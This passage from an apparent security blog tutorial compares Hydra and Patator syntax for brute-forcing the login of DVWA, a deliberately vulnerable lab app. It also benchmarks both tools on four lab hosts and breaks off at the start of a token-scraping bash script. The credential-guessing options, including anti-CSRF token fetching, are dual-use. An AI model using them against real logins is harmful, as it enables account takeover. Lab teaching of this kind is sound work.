&lt;a name="Summary"&gt;&lt;/a&gt;
&lt;h2&gt;Summary&lt;/h2&gt;

&lt;a name="Hydra.vs.Patator.Syntax"&gt;&lt;/a&gt;
&lt;h3&gt;Hydra vs Patator Syntax&lt;/h3&gt;

&lt;p&gt;This will show the some differences between Hydra and Patator commands:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Main Program&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;THC-Hydra: &lt;code&gt;hydra&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;patator&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Single usernames to use&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-l admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Happens with in &lt;code&gt;url="http://192.168.1.44/...&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Single password to use&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-p password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Happens with in &lt;code&gt;url="http://192.168.1.44/...&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;List of usernames to use&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-L /usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;0=/usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;List of passwords to use&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-P /usr/share/seclists/Passwords/500-worst-passwords.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;1=/usr/share/seclists/Passwords/500-worst-passwords.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Use empty passwords/repeat username as password&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-e ns&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does not have the option.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Try all the passwords, before trying the next password&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-u&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: The password wordlist (&lt;code&gt;FILE0&lt;/code&gt;) has a &lt;strong&gt;lower ID&lt;/strong&gt; than the username wordlist (&lt;code&gt;FILE1&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Quit after finding a valid login&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-F&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;-x quit:...&lt;/code&gt;. More about this later.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Limit the threads&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-t 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;--threads=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Timeout value on request&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-w 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;timeout=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Timeout before starting next thread&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-W 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;--rate-limit=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Verbose (aka show redirects)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-v&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does it out of the box (To hide them: &lt;code&gt;-x ignore:code='301'&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Show password attempts&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-V&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does it out of the box (To hide them: &lt;code&gt;-x ignore:fgrep='Username and/or password incorrect.'&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;The target to attack&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;192.168.1.44&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Happens later (&lt;code&gt;url="http://192.168.1.44/DVWA/login.php"...&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Module to use&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;http-get-form&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;http_fuzz&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;How to transmit the data&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. It is done in the module name. (&lt;code&gt;http-get-form&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;method=GET&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Web page to attack&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;"/DVWA/login.php:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;url="http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login"&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;GET data to send&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Happens with in &lt;code&gt;url="http://192.168.1.44/...&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Cookie/Header data to send&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:H=Cookie: security=low; PHPSESSID=${SESSIONID}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;header="Cookie: security=low; PHPSESSID=${SESSIONID}"&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Whitelist page response&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:S=Welcome to the password protected area&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator #1: &lt;code&gt;-x quit:fgrep="Welcome to the password protected area"&lt;/code&gt;. Quit when this value is found the first time.&lt;/li&gt;
&lt;li&gt;Patator #2: &lt;code&gt;-x ignore:fgrep!="Welcome to the password protected area"&lt;/code&gt;. Only display pages which do match.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Blacklist page response&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:F=Username and/or password incorrect.&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator #1: &lt;code&gt;-x quit:fgrep!='Username and/or password incorrect.'&lt;/code&gt;. Quit as soon as this is NOT found.&lt;/li&gt;
&lt;li&gt;Patator #2: &lt;code&gt;-x ignore:fgrep='Username and/or password incorrect.'&lt;/code&gt;. Only print pages which do NOT match.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Blacklist page length of &lt;code&gt;4945&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:F=Content-Length\: 4945&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;-x ignore:clen=4945&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;AND operator&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Does not have the feature.&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;,clen!='...&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Do not follow requests&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Have to use a proxy in line with it.&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;follow=0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Do not accept cookies&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Have to use a proxy in line with it.&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;accept_cookie=0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Use in a HTTP proxy&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;http_proxy=127.0.0.1:8080&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Amount of retires to perform&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Does not have the feature.&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;--max-retries=0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Visit a page before the request, to get a input to use as a value (aka anti-CSRF bypassing)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Does not have the exact feature (closest is: &lt;code&gt;:C=/page_to_get_cookie_value_only&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;before_urls="http://.../"  before_egrep="_CSRF_:&amp;lt;input type='hidden' name='csrf_token' value='(\w+)' /&amp;gt;"&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Benchmark"&gt;&lt;/a&gt;
&lt;h3&gt;Benchmark&lt;/h3&gt;

&lt;p&gt;Each test was repeated three times and the average value was taken. The value displayed are in seconds. The password wordlist used was &lt;code&gt;/usr/share/seclists/Passwords/passwords_clarkson_82.txt&lt;/code&gt; &lt;em&gt;(which is a poor wordlist for the record)&lt;/em&gt;, and &lt;code&gt;/usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt; for the usernames. Both Hydra and Patator will stop when they find the first (and only) valid user (&lt;code&gt;admin:password&lt;/code&gt;). This means they will produce 508 requests in order to find the successful account. In addition, there was not any waiting between threads ending. There were two different timeout values used (3 seconds and 10 seconds), which is shown in the tables below.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hardware &amp;amp; Software&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;192.168.1.11&lt;/code&gt; - Raspberry Pi v1 "B" Arch Linux // Nginx v1.8.0 // PHP v5.6.14 // MariaDB v10.0.21&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.22&lt;/code&gt; - Raspberry Pi v2 "B" Raspbian // Apache v2.4.10 // PHP v5.6.13 // MySQL v5.5.44&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; - Windows XP SP3 (VM: 1 Core/512 MB) // Apache v2.4.10 (XAMPP v1.8.2) // PHP v5.4.31 // MySQL v5.5.39&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.44&lt;/code&gt; - Windows Server 2012 (VM: 1 Core/2048 MB) // IIS v8.0 // PHP v5.6.0 // MySQL v5.5.45&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;Results:&lt;/strong&gt; (With 3 seconds timeout)&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;HYDRA&lt;/strong&gt;   &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 152              &lt;/td&gt;
&lt;td&gt; 67               &lt;/td&gt;
&lt;td&gt; 79               &lt;/td&gt;
&lt;td&gt; 36               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 141              &lt;/td&gt;
&lt;td&gt; 49               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 38               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 140              &lt;/td&gt;
&lt;td&gt; 49               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 36               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 8 Threads   &lt;/td&gt;
&lt;td&gt; 140              &lt;/td&gt;
&lt;td&gt; 47               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 36               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 16 Threads  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 44[*]            &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 39               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 32 Threads  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 45               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;PATATOR&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 72               &lt;/td&gt;
&lt;td&gt; 28               &lt;/td&gt;
&lt;td&gt; 43               &lt;/td&gt;
&lt;td&gt; 18               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 69               &lt;/td&gt;
&lt;td&gt; 24               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 19               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 69               &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 19               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 8 Threads   &lt;/td&gt;
&lt;td&gt; 70               &lt;/td&gt;
&lt;td&gt; 18               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 19               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 16 Threads  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 19               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 32 Threads  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 43[**]           &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 22               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;ul&gt;
&lt;li&gt;[*] == One pass did not not find the password.&lt;/li&gt;
&lt;li&gt;[**] == More than one thread timeout, but still found the password.&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Results:&lt;/strong&gt; (With 10 seconds timeout)&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;HYDRA&lt;/strong&gt;   &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 162              &lt;/td&gt;
&lt;td&gt; 66               &lt;/td&gt;
&lt;td&gt; 78               &lt;/td&gt;
&lt;td&gt; 39               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 141              &lt;/td&gt;
&lt;td&gt; 48               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 42               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 140              &lt;/td&gt;
&lt;td&gt; 49               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 38               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 8 Threads   &lt;/td&gt;
&lt;td&gt; 140              &lt;/td&gt;
&lt;td&gt; 50               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 41               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 16 Threads  &lt;/td&gt;
&lt;td&gt; 139              &lt;/td&gt;
&lt;td&gt; 49               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 41               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 32 Threads  &lt;/td&gt;
&lt;td&gt; 141              &lt;/td&gt;
&lt;td&gt; 49               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 44               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;PATATOR&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 72               &lt;/td&gt;
&lt;td&gt; 32               &lt;/td&gt;
&lt;td&gt; 45               &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 70               &lt;/td&gt;
&lt;td&gt; 24               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 69               &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 8 Threads   &lt;/td&gt;
&lt;td&gt; 69               &lt;/td&gt;
&lt;td&gt; 23               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 19               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 16 Threads  &lt;/td&gt;
&lt;td&gt; 70               &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 32 Threads  &lt;/td&gt;
&lt;td&gt; 71               &lt;/td&gt;
&lt;td&gt; 30               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 22               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;p&gt;&lt;strong&gt;For the reason why Hydra is noticeable slower than Patator&lt;/strong&gt;, see the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;medium level&lt;/a&gt; benchmark results.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Further testing&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;The benchmark results are only for a single user (even though the username comes from a wordlist). So, how does Hydra &amp;amp; Patator compare when multiple users are brute forced? I believe this is where Hydra would start to outperform Patator as it is able to stop testing a value when a user is found, therefore it will produce less requests overall. The test would be, how many number of successful logins vs the time taken.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Bash Benchmark Command&lt;/strong&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;thread&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; ip in &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;33&lt;/span&gt; 44&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.${ip}/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID cookie &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="s1"&gt;'{print $7}'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
